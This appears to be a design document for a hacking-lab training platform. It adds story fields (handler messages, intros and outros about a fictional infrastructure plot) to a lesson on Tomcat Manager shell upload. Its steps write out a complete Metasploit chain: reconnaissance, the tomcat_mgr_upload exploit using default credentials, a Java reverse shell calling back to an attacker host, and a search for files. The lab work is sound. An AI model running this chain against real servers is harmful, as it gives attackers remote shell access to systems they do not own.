# Enhanced Episode JSON Schema

This shows the NEW narrative fields added to the existing lesson structure.

## New Top-Level Fields

```json
{
  "id": "tomcat-upload",
  "name": "Tomcat Manager Shell Upload",

  "episode_number": 3,
  "episode_title": "THE DEPLOYMENT",

  "handler_message": {
    "text": "The Tomcat server at 172.20.0.19 handles Cerberus deployment staging. Marcus Webb approved the current build three days ago.\n\nWhatever NIGHTFALL is, it's being assembled there.\n\nGet inside. Find out what they're building.\n\nAnd watch your back. They're getting closer.",
    "timestamp": "03:47:22 UTC"
  },

  "episode_intro": "Three days ago I was nobody. Now I'm on a list.\n\nThe FTP server gave me names. David Chen's machine gave me context. He was asking questions. Now he's gone.\n\nTonight's target: Cerberus Systems internal deployment server. A Tomcat instance running their staging environment. Whatever NIGHTFALL is, the pieces are moving through here.\n\nI need to get inside. Upload my payload. See what they're building.\n\nAnd hope I'm not already too late.",

  "episode_outro": "The files are downloading. Build manifests. Deployment schedules.\n\nAnd then I see it. SCADA-BRIDGE.exe. A binary scheduled for deployment in 72 hours.\n\nI don't know what it does yet. But I know where it's going.\n\nPower substations. Water treatment. The grid.\n\nThis isn't corporate espionage. This is infrastructure warfare.\n\nAnd someone wants it to look like China pulled the trigger.\n\n[CONNECTION TERMINATED]\n\n> INCOMING [ENCRYPTED]\n> The executive file shares. 172.20.0.16.\n> The paper trail is there. Find Marcus Webb's files.\n> Hurry. They know you're inside.",

  "difficulty": "easy",
  "container": "tomcat",
  ...
}
```

## Enhanced Step Structure

Each step now has a `narrative` field (2-4 sentences, in-character):

```json
{
  "title": "Scan the target",
  "command": "nmap -sV 172.20.0.19 -p 8080",
  "explanation": "Verify Tomcat is running on port 8080.",
  "narrative": "Before we kick down any doors, we need to know what's behind them. Nmap fingerprints the service - version numbers, headers, anything that tells us what we're dealing with. Tomcat 9.0.30. Old enough to have the vulnerabilities we're counting on.",
  "expected": "8080/tcp open http Apache Tomcat",
  "duration": "5-10 sec"
}
```

## Full Step-by-Step with Narratives

### Step 1: Scan
```json
{
  "title": "Recon the target",
  "command": "nmap -sV 172.20.0.19 -p 8080",
  "narrative": "Before we kick down any doors, we need to know what's behind them. Nmap fingerprints the service - version numbers, headers, anything that tells us what we're dealing with. Information is ammunition."
}
```

### Step 2: Check Manager
```json
{
  "title": "Check for the Manager interface",
  "command": "curl -I http://172.20.0.19:8080/manager/html",
  "narrative": "Tomcat's Manager app is the skeleton key. If it exists and we have credentials, we can deploy anything we want. The 401 response confirms it's there - locked, but present. Now we just need the combination."
}
```

### Step 3: Start Metasploit
```json
{
  "title": "Load your arsenal",
  "command": "msfconsole -q",
  "narrative": "Metasploit. Fifteen years of exploit research packaged into a framework. Some call it a hacking tool. I call it a library. And tonight we're checking out a very specific book."
}
```

### Step 4: Load the exploit
```json
{
  "title": "Select your weapon",
  "command": "use exploit/multi/http/tomcat_mgr_upload",
  "narrative": "This module does the heavy lifting. It crafts a malicious WAR file - a Java web application containing our payload - and uploads it through the Manager interface. Once deployed, it executes. And we're in."
}
```

### Step 5-8: Configure target
```json
{
  "title": "Lock onto target",
  "command": "set RHOSTS 172.20.0.19",
  "narrative": "172.20.0.19. The Cerberus deployment server. According to the intel from David Chen's machine, this is where NIGHTFALL components are staged before deployment. Three more days until something very bad happens."
}
```

### Step 9: Choose payload
```json
{
  "title": "Prepare the payload",
  "command": "set PAYLOAD java/shell_reverse_tcp",
  "narrative": "Java reverse shell. When this executes on their server, it calls back to us. A phone line from inside their infrastructure, directly to our terminal. They won't see it in their logs until it's too late."
}
```

### Step 10: Set LHOST
```json
{
  "title": "Set the callback",
  "command": "set LHOST 172.20.0.5",
  "narrative": "This is us. Our attack box. When their server executes our payload, it needs to know where to call home. In thirty seconds, that connection will be our lifeline into Cerberus Systems."
}
```

### Step 11: Execute
```json
{
  "title": "Pull the trigger",
  "command": "run",
  "narrative": "No going back now. Metasploit generates the WAR, authenticates to Manager with default creds, uploads, deploys, triggers execution. If we're lucky, their SOC is asleep. If we're not... we'll find out fast."
}
```

### Step 12: Verify access
```json
{
  "title": "Confirm the breach",
  "command": "id",
  "narrative": "The cursor is blinking. No prompt. That's normal for raw shells - they don't waste bytes on pleasantries. Type 'id' anyway. Hit enter. If we see 'root'... we own this box."
}
```

### Step 13: Upgrade shell
```json
{
  "title": "Stabilize the connection",
  "command": "/bin/bash -i",
  "narrative": "Raw shells are fragile. One wrong keystroke and the connection dies. Interactive bash gives us a real prompt, history, tab completion. Professional tools for professional work."
}
```

### Step 14-15: Explore
```json
{
  "title": "Map the territory",
  "command": "ls -la /opt/tomcat/",
  "narrative": "We're inside. Now we need to understand what we're looking at. Deployment directories. Build artifacts. Configuration files. Somewhere in here is evidence of NIGHTFALL."
}
```

### Step 16: Find the evidence
```json
{
  "title": "Find what they're hiding",
  "command": "find / -name '*nightfall*' -o -name '*scada*' 2>/dev/null",
  "narrative": "Search for what matters. NIGHTFALL. SCADA. Infrastructure. Whatever Cerberus is building, they had to store it somewhere. And now we're on the inside, looking through their filing cabinets."
}
```

---

## Display Logic

The template would render these sections:

1. **Handler Message** - Styled as encrypted transmission (green text, monospace, redacted aesthetic)
2. **Episode Intro** - Italicized monologue before steps begin
3. **Steps** - Show `narrative` if present, fall back to `explanation` if not
4. **Episode Outro** - After final step, before "Try Another Hack"

## Backward Compatibility

- Old lessons without `episode_*` fields render normally
- `narrative` is optional per step; `explanation` remains the fallback
- Template checks for field existence before rendering

---

## CSS Styling (preview)

```css
.handler-message {
  background: #0a0a0a;
  border-left: 3px solid #00ff41;
  padding: 20px;
  font-family: 'Courier New', monospace;
  color: #00ff41;
  white-space: pre-wrap;
}

.handler-message::before {
  content: "> INCOMING [ENCRYPTED]";
  display: block;
  margin-bottom: 10px;
  opacity: 0.7;
}

.episode-intro {
  font-style: italic;
  color: #888;
  padding: 20px;
  border-bottom: 1px solid #2a2a3e;
  line-height: 1.8;
}

.episode-outro {
  margin-top: 40px;
  padding: 20px;
  background: linear-gradient(to bottom, transparent, rgba(255,0,0,0.1));
  border-top: 1px solid #ff3366;
}
```
